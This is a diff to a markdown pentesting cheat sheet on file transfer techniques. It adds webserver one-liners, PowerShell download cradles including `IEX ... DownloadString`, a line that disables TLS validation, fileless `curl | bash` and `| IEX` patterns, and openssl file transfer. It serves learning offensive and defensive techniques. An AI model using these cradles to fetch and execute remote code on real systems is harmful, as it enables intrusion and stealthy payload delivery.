@@ -40,6 +40,7 @@ We may use checksum functions/commands to check that the file was correctly tran
 Start a webserver allowing clients to download the files. You may try with `python2`, and `python3` if `python` is unavailable.
 
 ```shell!
+$ python2.7 -m SimpleHTTPServer
 $ python -m http.server port # port > 1023 | expose pwd
 $ python [...] --directory /path/to/server/root
 $ sudo python -m http.server port # port <= 1023
@@ -72,8 +73,6 @@ ftp> put <file>
 ftp> bye
 ```
 
-<br>
-
 #### Other webservers 🎡
 
 You may leverage an installed web development tool/package to start a webserver allowing clients to download files:
@@ -81,6 +80,7 @@ You may leverage an installed web development tool/package to start a webserver 
 ```shell!
 $ php -S 127.0.0.1:8080 # php
 $ http-server -p 8080   # node "http-server" package
+$ ruby -run -ehttpd . -p8080
 ```
 </div></div>
 
@@ -118,10 +118,10 @@ Run a webserver with an upload file form, such as the one below:
 ```ps
 $ sudo pip3 install uploadserver
 $ python3 -m uploadserver
+$ python3 -m uploadserver 443 --server-certificate cert.pem
 ```
 
 And make the client use it to upload the file.
-</div><div>
 
 #### Download From SMB Share
 
@@ -133,8 +133,7 @@ PS> robocopy \\HOST_IP\share_name\file_path .
 ```
 
 If guest access is not allowed, try [mounting the share](/operating-systems/networking/protocols/smb.md).
-
-<br>
+</div><div>
 
 #### Download From FTP Server
 
@@ -148,6 +147,23 @@ password: <blank>
 ftp> dir # list files
 ftp> get <file>
 ftp> bye
+```
+
+#### Window Utilities
+
+A few windows commands/tools we can use:
+
+```shell!
+PS> # all are said to be faster than iwr/curl/wget
+PS> (New-Object Net.WebClient).DownloadFile('URL','OUTPUT')
+PS> (New-Object Net.WebClient).DownloadFileAsync('URL','OUTPUT')
+PS> IEX (New-Object Net.WebClient).DownloadString('URL')
+```
+
+➡️ See also: [DownloadCradles.ps1](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) <small>(0.3k ⭐)</small>. Add the `-UseBasicParsing` in case of IE errors. To disable SSL/TLS:
+
+```shell!
+PS> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 </div></div>
 
@@ -192,6 +208,29 @@ Copy-paste may be an option, but not every file can be copy-pasted. One trick is
 
 <hr class="sep-both">
 
+## Fileless payloads 👻
+
+<div class="row row-cols-lg-2"><div>
+
+On Linux, we often use a pipe (`|`):
+
+```shell!
+$ curl [...] | bash
+$ wget -qO- [...] | bash
+$ [...] | python3
+```
+</div><div>
+
+On Windows, we often use:
+
+```shell!
+PS> IEX [...]
+PS> [...] | IEX
+```
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
@@ -201,5 +240,13 @@ Stuff that I found, but never read/used yet.
 * [Windows File Transfer Cheatsheet](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
 * [croc](https://github.com/schollz/croc)
 * [PSUpload](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)
+* `/dev/TCP`
+* can use cURL to upload files
+* can use openssl like nc
+
+```
+$ openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < file
+$ openssl s_client -connect IP -quiet > file
+```
 </div><div>
 </div></div>
